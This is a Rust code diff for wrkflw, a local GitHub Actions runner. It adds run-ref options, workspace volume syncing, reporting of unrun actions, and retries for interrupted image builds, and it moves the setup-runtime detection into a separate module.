@@ -11,7 +11,7 @@ use std::sync::{Arc, Mutex};
 use thiserror::Error;
 
 use crate::acceleration;
-use crate::action_resolver;
+use crate::action_resolver::{self, is_git_sha};
 use crate::checkout_sync::copy_directory_contents;
 use crate::dependency;
 use crate::docker;
@@ -22,6 +22,11 @@ use crate::kubernetes::{self, KubernetesConfig};
 use crate::live_step::LiveStep;
 use crate::matrix_fold::{matrix_twins, repeated_leg};
 use crate::podman;
+use crate::setup_actions::{
+    detect_setup, runner_node_install, rust_toolchain_extras, static_input, unrun_action_cause,
+    BuiltRuntimes, SetupDetection, SetupRuntime, NO_IMPLEMENTATION, PYTHON_SCRIPTS_DIR,
+    SETUP_ACTIONS, UV_PYTHON_DIR,
+};
 use wrkflw_logging;
 use wrkflw_matrix::MatrixCombination;
 use wrkflw_models::gitlab::Pipeline;
@@ -49,10 +54,12 @@ pub async fn execute_workflow(
     let is_gitlab = is_gitlab_pipeline(workflow_path);
 
     if is_gitlab {
-        return crate::vm_memory::with_run_pool(acceleration::without_run_state(
+        let result = crate::vm_memory::with_run_pool(acceleration::without_run_state(
             execute_gitlab_pipeline(workflow_path, config.clone()),
         ))
         .await;
+        crate::vm_workspace::wait_for_released_volumes().await;
+        return result;
     }
     let root = std::env::current_dir().map_err(|e| {
         ExecutionError::Execution(format!("Failed to get current directory: {}", e))
@@ -64,14 +71,18 @@ pub async fn execute_workflow(
     )
     .map_err(ExecutionError::Execution)?;
     // Each run gets its own job pool, sized once its runtime is known.
-    crate::vm_memory::with_run_pool(acceleration::with_run_state(
+    let result = crate::vm_memory::with_run_pool(acceleration::with_run_state(
         std::sync::Arc::new(state),
         crate::workspace::with_workflow_file(
             workflow_path,
             Box::pin(execute_github_workflow(workflow_path, config.clone())),
         ),
     ))
-    .await
+    .await;
+    // A fresh workspace's volume goes once its job container does; a run
+    // that ends here would otherwise leave the last ones behind.
+    crate::vm_workspace::wait_for_released_volumes().await;
+    result
 }
 
 /// Determine if a file is a GitLab CI/CD pipeline
@@ -138,8 +149,16 @@ async fn execute_github_workflow(
         .map_err(|e| ExecutionError::Execution(format!("Failed to create workspace: {}", e)))?;
 
     // 4. Set up GitHub-like environment
-    let (mut env_context, user_env) =
-        github_run_env(&workflow, workspace_dir.path(), &config.runtime_type)?;
+    let (mut env_context, user_env) = github_run_env(
+        &workflow,
+        workspace_dir.path(),
+        &config.runtime_type,
+        &environment::RunRef {
+            event_name: config.event_name.as_deref(),
+            git_ref: config.git_ref.as_deref(),
+            base_branch: config.base_branch.as_deref(),
+        },
+    )?;
 
     // show=true means hide=false (inverted for the env var)
     env_context.insert(
@@ -867,8 +886,9 @@ fn github_run_env(
     workflow: &WorkflowDefinition,
     workspace_dir: &Path,
     runtime: &RuntimeType,
+    run_ref: &environment::RunRef<'_>,
 ) -> Result<(EnvMap, EnvMap), ExecutionError> {
-    let mut env_context = environment::create_github_context(workflow, workspace_dir);
+    let mut env_context = environment::create_github_context(workflow, workspace_dir, run_ref);
     // Before the workflow env below, whose expressions must see what steps see.
     seed_runtime_context(&mut env_context, runtime, CiPlatform::GitHub);
 
@@ -1090,6 +1110,16 @@ pub struct ExecutionConfig {
     pub variables: HashMap<String, String>,
     /// What this run may do to avoid work. GitHub workflows only.
     pub acceleration: acceleration::Acceleration,
+    /// The event the run simulates, as `github.event_name`. Defaults to the
+    /// workflow's first trigger.
+    pub event_name: Option<String>,
+    /// The full ref the run is for, such as `refs/heads/release/2.0` or
+    /// `refs/tags/v1.0`, as `GITHUB_REF` and `github.ref_name`, and
+    /// `github.head_ref` for a pull request. Defaults to the checked-out
+    /// branch, which a detached HEAD lacks.
+    pub git_ref: Option<String>,
+    /// A pull request's target branch, as `github.base_ref`.
+    pub base_branch: Option<String>,
 }
 
 /// Parse a `LABEL=IMAGE` runner override, as given to `--platform`.
@@ -1176,15 +1206,14 @@ impl JobResult {
             name: stored.name,
             canonical_name: stored.canonical_name,
             status: JobStatus::Success,
-            steps: vec![StepResult::new(
-                step.to_string(),
-                StepStatus::Success,
-                note.to_string(),
-            )],
+            steps: vec![
+                StepResult::new(step.to_string(), StepStatus::Success, note.to_string())
+                    .without_running(stored.actions_not_run.into_iter().map(|a| a.uses)),
+            ],
             logs: note.to_string(),
             outputs: stored.outputs,
             failure_allowed: false,
-            repeated_from: None,
+            repeated_from: stored.repeated_from,
         }
     }
 
@@ -1294,6 +1323,11 @@ pub struct StepResult {
     pub conclusion: StepStatus,
     /// The process exit code, when the step ran a process.
     pub exit_code: Option<i32>,
+    /// The `uses:` references of actions that did not run, because wrkflw
+    /// has no implementation of them or their runtime isn't in the job's
+    /// image: the step's own action, or ones inside the composite action it
+    /// calls. Reported under `unverified`.
+    pub actions_not_run: Vec<String>,
 }
 
 impl StepResult {
@@ -1306,11 +1340,18 @@ impl StepResult {
             status,
             output,
             exit_code: None,
+            actions_not_run: Vec::new(),
         }
     }
 
     fn with_exit_code(mut self, exit_code: i32) -> Self {
         self.exit_code = Some(exit_code);
+        self
+    }
+
+    /// Mark the step as one that passed without running `uses`.
+    fn without_running(mut self, uses: impl IntoIterator<Item = String>) -> Self {
+        self.actions_not_run.extend(uses);
         self
     }
 }
@@ -1374,6 +1415,10 @@ enum PreparedAction {
     /// bash wrapper. If you need the image's native ENTRYPOINT/CMD,
     /// use `NativeDocker` instead.
     Image(String),
+    /// An action whose `action.yml` couldn't be fetched, so how it runs is
+    /// unknown. Run like `Image`, but a step that then runs nothing says the
+    /// fetch failed rather than that wrkflw has no implementation.
+    Unresolved { image: String, fetch_error: String },
     /// A composite action that needs special step-based execution.
     Composite,
 }
@@ -1457,6 +1502,7 @@ async fn prepare_action(
     }
 
     // GitHub action: try to fetch action.yml from the remote repository
+    let mut fetch_error: Option<String> = None;
     if !action.repository.is_empty() && !action.version.is_empty() {
         match action_resolver::resolve_remote_action(
             &action.repository,
@@ -1624,13 +1670,17 @@ async fn prepare_action(
                     "Could not fetch action.yml for {}@{}: {}. Falling back to built-in mapping.",
                     action.repository, action.version, e
                 ));
+                fetch_error = Some(e.to_string());
             }
         }
     }
 
     // Fallback: determine appropriate image based on hardcoded action type mapping
     let image = determine_action_image(&action.repository);
-    Ok(PreparedAction::Image(image))
+    Ok(match fetch_error {
+        Some(fetch_error) => PreparedAction::Unresolved { image, fetch_error },
+        None => PreparedAction::Image(image),
+    })
 }
 
 /// Execute a `NativeDocker` action step.
@@ -1675,7 +1725,13 @@ async fn execute_native_docker_step(
         ctx.container_config,
         ctx.runtime.mounts_are_copies(),
     );
-    let volumes = mount_ctx.build_volumes(ctx.working_dir, container_workspace);
+    let vm_workspace = crate::vm_workspace::before_step(ctx.runtime, ctx.working_dir)
+        .await
+        .map_err(ExecutionError::Runtime)?;
+    let mut volumes = mount_ctx.build_volumes(ctx.working_dir, container_workspace);
+    if let Some(vm) = &vm_workspace {
+        vm.mount_in(&mut volumes);
+    }
     let env_vars: Vec<(&str, &str)> = step_env
         .iter()
         .map(|(k, v)| (k.as_str(), v.as_str()))
@@ -1711,8 +1767,9 @@ async fn execute_native_docker_step(
             &volumes,
             entrypoint.as_deref(),
         )
-        .await
-        .map_err(|e| ExecutionError::Runtime(format!("{}", e)))?;
+        .await;
+    sync_workspace_back(vm_workspace.as_ref(), &output).await?;
+    let output = output.map_err(|e| ExecutionError::Runtime(format!("{}", e)))?;
 
     Ok(StepResult::new(
         step_name,
@@ -1727,6 +1784,47 @@ async fn execute_native_docker_step(
         ),
     )
     .with_exit_code(output.exit_code))
+}
+
+/// Copy back what a step that ran out of time wrote to the workspace
+/// volume. Its own copy back was cancelled with it, and the host-side work
+/// that follows, such as an artifact upload or a cache save, reads the host
+/// copy. The step has failed already, so a failed copy is a warning.
+async fn copy_back_after_timeout(working_dir: &Path) {
+    if let Err(e) = crate::vm_workspace::after_cancelled_step(working_dir).await {
+        wrkflw_logging::warning(&format!(
+            "The step ran out of time, and copying the workspace back after it failed: {}",
+            e
+        ));
+    }
+}
+
+/// Copy the workspace back after a step. A failed copy fails the step only
+/// when the step passed: a failed step's own exit code and output are what
+/// the user needs, so the copy's failure is a warning beside them.
+async fn sync_workspace_back(
+    vm: Option<&Arc<crate::vm_workspace::VmWorkspace>>,
+    ran: &Result<
+        wrkflw_runtime::container::ContainerOutput,
+        wrkflw_runtime::container::ContainerError,
+    >,
+) -> Result<(), ExecutionError> {
+    let Some(vm) = vm else {
+        return Ok(());
+    };
+    match vm.after_step().await {
+        Err(e) if matches!(ran, Ok(output) if output.exit_code == 0) => {
+            Err(ExecutionError::Runtime(e))
+        }
+        Err(e) => {
+            wrkflw_logging::warning(&format!(
+                "The step failed, and copying the workspace back after it failed too: {}",
+                e
+            ));
+            Ok(())
+        }
+        Ok(()) => Ok(()),
+    }
 }
 
 /// Sanitize a sub-path component from an action reference (e.g. `owner/repo/sub/path`).
@@ -1930,14 +2028,6 @@ async fn shallow_clone(
     Ok(())
 }
 
-/// Returns `true` if `git_ref` looks like a full SHA-1 hex hash (40 hex chars).
-///
-/// NOTE: This only detects SHA-1 (40 hex chars). Git's SHA-256 transition uses
-/// 64-char hashes — update this check if/when GitHub adopts SHA-256 refs.
-fn is_git_sha(git_ref: &str) -> bool {
-    git_ref.len() == 40 && git_ref.chars().all(|c| c.is_ascii_hexdigit())
-}
-
 /// Determine the appropriate Docker image for a GitHub action.
 ///
 /// Setup actions (from the `SETUP_ACTIONS` table) use the act runner base image
@@ -1968,283 +2058,39 @@ fn determine_action_image(repository: &str) -> String {
     }
 }
 
-/// A runtime detected from a setup action step (e.g., `actions/setup-node@v3`).
-#[derive(Clone)]
-struct SetupRuntime {
-    /// Language identifier (e.g., "node", "php", "python")
-    language: String,
-    /// Sanitized version string (e.g., "20", "8.2")
-    version: String,
-    /// Shell commands to install this runtime on an Ubuntu base image
-    install_script: String,
-}
+/// When `cause` says `uses` did not run, warn so and return it for the
+/// step's [`StepResult::actions_not_run`].
+/// Why an `actions-rs/cargo` step that ran its `command` doesn't count as
+/// run in a container runtime.
+const CARGO_RAN_ON_HOST: &str = "its cargo command ran on this machine, not in the job's image";
 
-/// Definition of a known setup action for runtime detection.
-///
-/// Used by both `detect_setup_runtimes` (to build combined images) and
-/// `determine_action_image` (to select per-step images), keeping the two
-/// in sync automatically.
-struct SetupActionDef {
-    /// Repository names that map to this runtime (exact match, no @version suffix).
-    repos: &'static [&'static str],
-    /// The `with:` key that specifies the version.
-    with_key: &'static str,
-    /// Default version when no `with:` key is provided.
-    default_version: &'static str,
-    /// Language identifier used in install scripts and image tags.
-    language: &'static str,
-    /// If true, fall back to the @ref from the `uses:` field when no `with:` key is set.
-    /// Used by `dtolnay/rust-toolchain` which encodes the toolchain in the ref.
-    version_from_ref: bool,
-}
-
-const SETUP_ACTIONS: &[SetupActionDef] = &[
-    SetupActionDef {
-        repos: &["actions/setup-node"],
-        with_key: "node-version",
-        default_version: "20",
-        language: "node",
-        version_from_ref: false,
-    },
-    SetupActionDef {
-        repos: &["shivammathur/setup-php"],
-        with_key: "php",
-        default_version: "8.2",
-        language: "php",
-        version_from_ref: false,
-    },
-    SetupActionDef {
-        repos: &["actions/setup-python"],
-        with_key: "python-version",
-        default_version: "3.11",
-        language: "python",
-        version_from_ref: false,
-    },
-    SetupActionDef {
-        repos: &["actions/setup-go"],
-        with_key: "go-version",
-        default_version: "1.21",
-        language: "go",
-        version_from_ref: false,
-    },
-    SetupActionDef {
-        repos: &["actions/setup-java"],
-        with_key: "java-version",
-        default_version: "17",
-        language: "java",
-        version_from_ref: false,
-    },
-    SetupActionDef {
-        repos: &["actions/setup-dotnet"],
-        with_key: "dotnet-version",
-        default_version: "7.0",
-        language: "dotnet",
-        version_from_ref: false,
-    },
-    SetupActionDef {
-        repos: &["actions-rs/toolchain", "dtolnay/rust-toolchain"],
-        with_key: "toolchain",
-        default_version: "stable",
-        language: "rust",
-        version_from_ref: true,
-    },
-];
-
-/// Check that a version string contains only safe characters (alphanumeric, dots, hyphens, underscores).
-fn is_safe_version(version: &str) -> bool {
-    !version.is_empty()
-        && version
-            .chars()
-            .all(|c| c.is_alphanumeric() || c == '.' || c == '-' || c == '_')
-}
-
-/// Scan job steps for known setup actions and return the runtimes they configure.
-///
-/// If the same language appears multiple times, only the last occurrence is kept
-/// (matching GitHub Actions behavior where later setup steps override earlier ones).
-fn detect_setup_runtimes(steps: &[Step]) -> Vec<SetupRuntime> {
-    let mut runtimes: Vec<SetupRuntime> = Vec::new();
-
-    for step in steps {
-        let uses = match &step.uses {
-            Some(u) => u,
-            None => continue,
-        };
-
-        // Split "actions/setup-node@v3" into ("actions/setup-node", Some("v3"))
-        let (repo, git_ref) = match uses.split_once('@') {
-            Some((r, v)) => (r, Some(v)),
-            None => (uses.as_str(), None),
-        };
-
-        let def = match SETUP_ACTIONS.iter().find(|d| d.repos.contains(&repo)) {
-            Some(d) => d,
-            None => continue,
-        };
-
-        let with = step.with.as_ref();
-        let ver = with
-            .and_then(|w| w.get(def.with_key))
-            .cloned()
-            .or_else(|| {
-                // Some actions encode the version in the @ref (e.g., dtolnay/rust-toolchain@nightly).
-                // Skip bare git SHAs — they pin the action version, not the toolchain.
-                if def.version_from_ref {
-                    git_ref.filter(|r| !is_git_sha(r)).map(|r| r.to_string())
-                } else {
-                    None
-                }
-            })
-            .unwrap_or_else(|| def.default_version.to_string());
-
-        // Normalize trailing ".x" suffix (e.g., "16.x" -> "16") so it doesn't
-        // leak into install scripts for languages that don't expect it.
-        let ver = if ver.ends_with(".x") {
-            ver[..ver.len() - 2].to_string()
-        } else {
-            ver
-        };
-
-        if !is_safe_version(&ver) {
-            wrkflw_logging::warning(&format!(
-                "Ignoring {} with invalid version: {:?}",
-                def.language, ver
-            ));
-            continue;
-        }
-
-        let rt = SetupRuntime {
-            language: def.language.to_string(),
-            version: ver.clone(),
-            install_script: get_install_script(def.language, &ver),
-        };
-
-        // Deduplicate: later setup steps override earlier ones for the same language
-        let existing_idx = runtimes.iter().position(|r| r.language == rt.language);
-        if let Some(idx) = existing_idx {
-            runtimes[idx] = rt;
-        } else {
-            runtimes.push(rt);
-        }
-    }
-
-    // Every Rust toolchain step's components and targets go into the image,
-    // so each step's own container has them, as GitHub's runner keeps them
-    // for the rest of the job. Ones set by an expression aren't known yet.
-    if let Some(rust) = runtimes.iter_mut().find(|rt| rt.language == "rust") {
-        let repos = SETUP_ACTIONS
-            .iter()
-            .find(|def| def.language == "rust")
-            .map(|def| def.repos)
-            .unwrap_or_default();
-        let mut extras: Vec<String> = Vec::new();
-        for step in steps {
-            let Some(uses) = &step.uses else { continue };
-            let repo = uses.split_once('@').map_or(uses.as_str(), |(r, _)| r);
-            if !repos.contains(&repo) {
-                continue;
-            }
-            if let Some(with) = &step.with {
-                for command in rust_toolchain_extras(with, static_input) {
-                    if !extras.contains(&command) {
-                        extras.push(command);
-                    }
-                }
-            }
-        }
-        for command in extras {
-            rust.install_script.push_str(" && ");
-            rust.install_script.push_str(&command);
-        }
-    }
-
-    runtimes
-}
-
-/// Return shell commands that install a language runtime on an Ubuntu base image.
-fn get_install_script(language: &str, version: &str) -> String {
-    match language {
-        "node" => {
-            // Strip .x suffix for nodesource URL (e.g., "16.x" -> "16")
-            let major = version.split('.').next().unwrap_or(version);
-            format!(
-                "curl -fsSL https://deb.nodesource.com/setup_{}.x | bash - && apt-get install -y nodejs",
-                major
-            )
-        }
-        "php" => {
-            format!(
-                "apt-get install -y software-properties-common && \
-                 add-apt-repository -y ppa:ondrej/php && apt-get update && \
-                 apt-get install -y php{ver}-cli php{ver}-mbstring php{ver}-xml php{ver}-curl unzip && \
-                 curl -sS https://getcomposer.org/installer | php -- --install-dir=/usr/local/bin --filename=composer",
-                ver = version
-            )
-        }
-        "python" => {
-            format!(
-                "apt-get install -y software-properties-common && \
-                 add-apt-repository -y ppa:deadsnakes/ppa && apt-get update && \
-                 apt-get install -y python{ver} python{ver}-venv && \
-                 ln -sf /usr/bin/python{ver} /usr/bin/python && \
-                 ln -sf /usr/bin/python{ver} /usr/bin/python3 && \
-                 curl -sS https://bootstrap.pypa.io/get-pip.py | python{ver}",
-                ver = version
-            )
-        }
-        "go" => {
-            format!(
-                "ARCH=$(dpkg --print-architecture || echo amd64) && \
-                 curl -fsSL https://go.dev/dl/go{}.linux-${{ARCH}}.tar.gz | tar -C /usr/local -xz && \
-                 ln -s /usr/local/go/bin/go /usr/bin/go",
-                version
-            )
-        }
-        "java" => {
-            format!(
-                "apt-get install -y wget apt-transport-https gpg && \
-                 wget -qO - https://packages.adoptium.net/artifactory/api/gpg/key/public | gpg --dearmor -o /usr/share/keyrings/adoptium.gpg && \
-                 echo 'deb [signed-by=/usr/share/keyrings/adoptium.gpg] https://packages.adoptium.net/artifactory/deb $(cat /etc/os-release | grep UBUNTU_CODENAME | cut -d= -f2) main' > /etc/apt/sources.list.d/adoptium.list && \
-                 apt-get update && apt-get install -y temurin-{}-jdk",
-                version
-            )
-        }
-        "dotnet" => {
-            format!(
-                "apt-get install -y wget && \
-                 wget https://dot.net/v1/dotnet-install.sh -O /tmp/dotnet-install.sh && \
-                 chmod +x /tmp/dotnet-install.sh && \
-                 /tmp/dotnet-install.sh --channel {} --install-dir /usr/share/dotnet && \
-                 ln -s /usr/share/dotnet/dotnet /usr/bin/dotnet",
-                version
-            )
-        }
-        // Images such as `rust:1` already have rustup, under a `CARGO_HOME`
-        // other than `~/.cargo`, so use the one there and only install it
-        // when it's missing. Its directory is linked into /usr/local/bin
-        // unless it is already a system directory on PATH: linking all of
-        // /usr/bin would be wrong, and linking /usr/local/bin into itself
-        // fails and would stop the build.
-        "rust" => {
-            format!(
-                "export PATH=\"${{CARGO_HOME:-$HOME/.cargo}}/bin:$PATH\" && \
-                 (command -v rustup >/dev/null 2>&1 || \
-                  curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y --no-modify-path --default-toolchain {v}) && \
-                 rustup default {v} && \
-                 d=\"$(dirname \"$(command -v rustup)\")\" && \
-                 case \"$d\" in /usr/local/bin|/usr/bin|/bin) ;; *) ln -sf \"$d\"/* /usr/local/bin/ ;; esac",
-                v = version
-            )
-        }
-        _ => String::new(),
-    }
+fn report_action_not_run(uses: &str, cause: Option<&str>) -> Option<String> {
+    let cause = cause?;
+    wrkflw_logging::warning(&format!(
+        "{}: not run ({}), so the step passes without doing anything. Anything it \
+         would install, configure or check is missing from this job",
+        uses, cause
+    ));
+    Some(uses.to_string())
 }
 
 /// Generate a Dockerfile that installs multiple language runtimes on an Ubuntu base.
 ///
+/// `base_id` is the base image's local content ID, when known. It goes into
+/// the Dockerfile as a comment, so the image tag, a hash of this text,
+/// changes when the base image changes under the same name. Without it a
+/// re-pulled or rebuilt base would keep serving the old combined image.
+///
 /// Extracted as a pure function so the output can be unit-tested without Docker.
-fn generate_combined_dockerfile(runtimes: &[SetupRuntime], base_image: &str) -> String {
+fn generate_combined_dockerfile(
+    runtimes: &[SetupRuntime],
+    base_image: &str,
+    base_id: Option<&str>,
+) -> String {
     let mut dockerfile = format!("FROM {}\n", base_image);
+    if let Some(id) = base_id {
+        dockerfile.push_str(&format!("# base image id: {}\n", id));
+    }
 
     // Combine base packages and all runtime install scripts into a single
     // RUN directive so there is only one `apt-get update` call and the Docker
@@ -2257,12 +2103,27 @@ fn generate_combined_dockerfile(runtimes: &[SetupRuntime], base_image: &str) -> 
 
     // `build-essential` because hosted Ubuntu runners have a C toolchain,
     // and Rust build scripts, node-gyp, Python C extensions and cgo all
-    // expect one.
+    // expect one. `less` because they have a pager, which tests of CLI
+    // tools run.
+    // uv keeps the interpreters it installs under `$HOME`, which is root's
+    // and closed to a step that runs as another user, and which a job that
+    // sets `HOME` moves. Somewhere fixed and readable serves every step.
+    if runtimes.iter().any(|rt| rt.language == "python") {
+        dockerfile.push_str(&format!("ENV UV_PYTHON_INSTALL_DIR={}\n", UV_PYTHON_DIR));
+    }
     dockerfile.push_str("RUN apt-get update && \\\n");
     dockerfile.push_str(
         "    apt-get install -y --no-install-recommends curl bash git ca-certificates gnupg \
-         build-essential",
+         build-essential less",
     );
+
+    // Hosted runners also have Node.js whatever the job sets up, and tools
+    // such as pyright install their own copy unless one is on PATH. A
+    // base image that has one keeps it, and setup-node replaces it.
+    if !runtimes.iter().any(|rt| rt.language == "node") {
+        dockerfile.push_str(" && \\\n");
+        dockerfile.push_str(&format!("    {}", runner_node_install()));
+    }
 
     for script in &scripts {
         dockerfile.push_str(" && \\\n");
@@ -2274,9 +2135,49 @@ fn generate_combined_dockerfile(runtimes: &[SetupRuntime], base_image: &str) -> 
     // Base images can bundle tools ahead of the system directories. The act
     // images do this with Node, which would shadow the version a setup action
     // just installed. Every install script lands in one of these directories.
-    dockerfile.push_str("ENV PATH=/usr/local/bin:/usr/bin:$PATH\n");
+    // setup-python puts its interpreter's scripts first, so what `pip
+    // install` adds runs by name.
+    if runtimes.iter().any(|rt| rt.language == "python") {
+        dockerfile.push_str(&format!(
+            "ENV PATH={}:/usr/local/bin:/usr/bin:$PATH\n",
+            PYTHON_SCRIPTS_DIR
+        ));
+    } else {
+        dockerfile.push_str("ENV PATH=/usr/local/bin:/usr/bin:$PATH\n");
+    }
 
     dockerfile
+}
+
+/// Whether `version` names a channel or a range rather than a release, so
+/// what it installs changes as releases come out: `latest`, `stable`,
+/// `oldstable`, `lts/*`, `3.x`, `>=3.10`, `^18 || >=20`. A partial release
+/// such as `3.12` drifts only by patch releases and counts as fixed.
+fn is_floating_version(version: &str) -> bool {
+    let version = version.trim().to_ascii_lowercase();
+    let channel = version.chars().any(|c| c.is_ascii_alphabetic())
+        && !version.chars().next().is_some_and(|c| c.is_ascii_digit());
+    channel
+        || version.contains(['x', '*', '>', '<', '^', '~', '|', ' '])
+        || version.ends_with("-dev")
+}
+
+/// The ISO week `now` falls in, as `2026-W46`, when any of `runtimes`
+/// floats: images built for it are rebuilt once a week, so a floating
+/// version keeps up with releases, as the hosted actions resolve it on
+/// every run.
+fn floating_versions_week(
+    runtimes: &[SetupRuntime],
+    now: chrono::DateTime<chrono::Utc>,
+) -> Option<String> {
+    use chrono::Datelike;
+    runtimes
+        .iter()
+        .any(|rt| is_floating_version(&rt.version))
+        .then(|| {
+            let week = now.iso_week();
+            format!("{}-W{:02}", week.year(), week.week())
+        })
 }
 
 /// FNV-1a hash — deterministic across Rust toolchain versions, unlike `DefaultHasher`.
@@ -2298,9 +2199,22 @@ fn fnv1a_hash(data: &[u8]) -> u64 {
 /// are unchanged.  Uses FNV-1a rather than `DefaultHasher` so the tag is
 /// stable across Rust toolchain upgrades.
 fn combined_image_tag(runtimes: &[SetupRuntime], dockerfile: &str) -> String {
+    // A version may be a specifier such as `>=3.10`, which a tag can't hold.
+    // The hash below still tells such images apart.
     let mut tag_parts: Vec<String> = runtimes
         .iter()
-        .map(|r| format!("{}{}", r.language, r.version))
+        .map(|r| {
+            format!("{}{}", r.language, r.version)
+                .chars()
+                .map(|c| {
+                    if c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_') {
+                        c
+                    } else {
+                        '_'
+                    }
+                })
+                .collect()
+        })
         .collect();
     tag_parts.sort();
 
@@ -2329,12 +2243,38 @@ async fn build_combined_runtime_image(
     base_image: &str,
     runtime: &dyn ContainerRuntime,
 ) -> Result<String, ExecutionError> {
-    let dockerfile = generate_combined_dockerfile(runtimes, base_image);
+    // The base image's identity, so a changed base gets a new combined image.
+    // An image not yet present is pulled first: the build would pull it
+    // anyway, and knowing its ID now saves a rebuild on the next run. A
+    // runtime that can't name images isn't asked to pull for nothing.
+    let base_id = match runtime.image_id(base_image).await {
+        Some(id) => Some(id),
+        None if !runtime.identifies_images() => None,
+        None => {
+            if let Err(e) = runtime.pull_image(base_image).await {
+                wrkflw_logging::debug(&format!(
+                    "Could not pull {} before building on it: {}",
+                    base_image, e
+                ));
+            }
+            runtime.image_id(base_image).await
+        }
+    };
+    let mut dockerfile = generate_combined_dockerfile(runtimes, base_image, base_id.as_deref());
+    // A version such as `oldstable` or `3.x` names a different release as
+    // time goes on, and the tag would otherwise keep the first build's.
+    if let Some(week) = floating_versions_week(runtimes, chrono::Utc::now()) {
+        dockerfile.push_str(&format!("# floating versions resolved in {}\n", week));
+    }
     let tag = combined_image_tag(runtimes, &dockerfile);
 
     // Fast path: image already exists, no locking needed.
     let exists = runtime.image_exists(&tag).await.map_err(|e| {
-        ExecutionError::Runtime(format!("Failed to check for existing image: {}", e))
+        ExecutionError::Runtime(format!(
+            "{}: {}",
+            crate::setup_errors::EXISTING_IMAGE_CHECK,
+            e
+        ))
     })?;
     if exists {
         wrkflw_logging::info(&format!("Reusing existing combined runtime image: {}", tag));
@@ -2354,7 +2294,11 @@ async fn build_combined_runtime_image(
 
     // Re-check after acquiring the lock: a concurrent job may have built it.
     let exists = runtime.image_exists(&tag).await.map_err(|e| {
-        ExecutionError::Runtime(format!("Failed to check for existing image: {}", e))
+        ExecutionError::Runtime(format!(
+            "{}: {}",
+            crate::setup_errors::EXISTING_IMAGE_CHECK,
+            e
+        ))
     })?;
     if exists {
         wrkflw_logging::info(&format!("Reusing existing combined runtime image: {}", tag));
@@ -2378,14 +2322,75 @@ async fn build_combined_runtime_image(
             .join(", ")
     ));
 
-    runtime
-        .build_image(&dockerfile_path, &tag, temp_dir.path())
+    build_image_checked(runtime, &dockerfile_path, &tag, temp_dir.path())
         .await
         .map_err(|e| {
-            ExecutionError::Runtime(format!("Failed to build combined runtime image: {}", e))
+            ExecutionError::Runtime(format!(
+                "{}: {}",
+                crate::setup_errors::COMBINED_IMAGE_BUILD,
+                e
+            ))
         })?;
 
     Ok(tag)
+}
+
+/// Whether a build error is the connection to the engine failing rather
+/// than the build: the stream of build output ended early or was cut. The
+/// same build may well work on a second try.
+///
+/// Only the error's first line counts. What follows it is the build's own
+/// output, where a failing `RUN` may well print "connection reset", and
+/// that build would fail the same way again.
+fn is_transport_error(message: &str) -> bool {
+    let message = message
+        .lines()
+        .next()
+        .unwrap_or_default()
+        .to_ascii_lowercase();
+    [
+        "bytes remaining on stream",
+        "connection reset",
+        "connection closed",
+        "broken pipe",
+        "unexpected eof",
+        "error reading a body",
+        "incomplete message",
+    ]
+    .iter()
+    .any(|sign| message.contains(sign))
+}
+
+/// Build `tag`, telling a build that failed from one whose report of
+/// success was lost. A tag is only applied when a build succeeds, and
+/// callers build only a tag that doesn't exist yet, so finding it after an
+/// error means it built. An error in the connection to the engine is tried
+/// once more; any other is the build's own and is returned.
+async fn build_image_checked(
+    runtime: &dyn ContainerRuntime,
+    dockerfile: &Path,
+    tag: &str,
+    context_dir: &Path,
+) -> Result<(), wrkflw_runtime::container::ContainerError> {
+    let first = match runtime.build_image(dockerfile, tag, context_dir).await {
+        Ok(()) => return Ok(()),
+        Err(e) => e,
+    };
+    if runtime.image_exists(tag).await.unwrap_or(false) {
+        wrkflw_logging::warning(&format!(
+            "Building {} reported an error, but the image was built, so it is used: {}",
+            tag, first
+        ));
+        return Ok(());
+    }
+    if !is_transport_error(&first.to_string()) {
+        return Err(first);
+    }
+    wrkflw_logging::warning(&format!(
+        "Building {} lost its connection to the container engine ({}); trying once more",
+        tag, first
+    ));
+    runtime.build_image(dockerfile, tag, context_dir).await
 }
 
 /// Hash everything a Dockerfile action's image is built from, so the same
@@ -2497,7 +2502,7 @@ async fn ensure_action_image(
     };
     let _build_guard = tag_lock.lock().await;
     if !runtime.image_exists(&tag).await? {
-        runtime.build_image(dockerfile, &tag, context_dir).await?;
+        build_image_checked(runtime, dockerfile, &tag, context_dir).await?;
     }
     Ok(tag)
 }
@@ -2514,20 +2519,55 @@ async fn resolve_runner_image(
     runtime: &dyn ContainerRuntime,
     platform_overrides: &HashMap<String, String>,
     matrix: Option<&HashMap<String, Value>>,
-) -> Result<String, ExecutionError> {
+) -> Result<RunnerImage, ExecutionError> {
     let base_image = get_effective_runner_image(job, platform_overrides, matrix);
 
+    // A job container is used as is: no setup runtime goes into it.
     if job.container.is_some() {
-        return Ok(base_image);
+        return Ok(RunnerImage::plain(base_image));
     }
 
-    let setup_runtimes = detect_setup_runtimes(steps);
-    if setup_runtimes.is_empty() {
-        Ok(base_image)
+    let SetupDetection {
+        runtimes,
+        not_built,
+    } = detect_setup(steps);
+    if runtimes.is_empty() {
+        Ok(RunnerImage {
+            built: BuiltRuntimes {
+                installed: Vec::new(),
+                not_built,
+            },
+            ..RunnerImage::plain(base_image)
+        })
     } else {
         // Always build a combined image on the runner base so that essential
         // tools (git, curl, etc.) remain available for actions like checkout.
-        build_combined_runtime_image(&setup_runtimes, &base_image, runtime).await
+        let image = build_combined_runtime_image(&runtimes, &base_image, runtime).await?;
+        Ok(RunnerImage {
+            image,
+            built: BuiltRuntimes {
+                installed: runtimes.into_iter().map(|rt| rt.language).collect(),
+                not_built,
+            },
+        })
+    }
+}
+
+/// The image a job's steps run in, and the setup runtimes built into it.
+#[derive(Debug, Clone, PartialEq)]
+struct RunnerImage {
+    image: String,
+    /// The setup runtimes the image holds, and those left out. Empty for a
+    /// job container or an image used as is.
+    built: BuiltRuntimes,
+}
+
+impl RunnerImage {
+    fn plain(image: String) -> Self {
+        Self {
+            image,
+            built: BuiltRuntimes::default(),
+        }
     }
 }
 
@@ -2861,7 +2901,11 @@ async fn execute_job_with_matrix(
             verbose,
             services,
         };
-        let result = job_session::with_job_session(job, runtime, execute_job(ctx)).await?;
+        let result = crate::job_memory::metered(
+            job_session::with_job_session(job, runtime, execute_job(ctx)),
+            job_passed,
+        )
+        .await?;
         let results = vec![result];
         store_passing_result(result_key.as_deref(), &results, env_context).await;
         Ok(results)
@@ -2880,13 +2924,20 @@ fn announce_reused(
         canonical_name: stored.canonical_name.clone(),
     });
     crate::runner_fidelity::announce(&stored.name, runner);
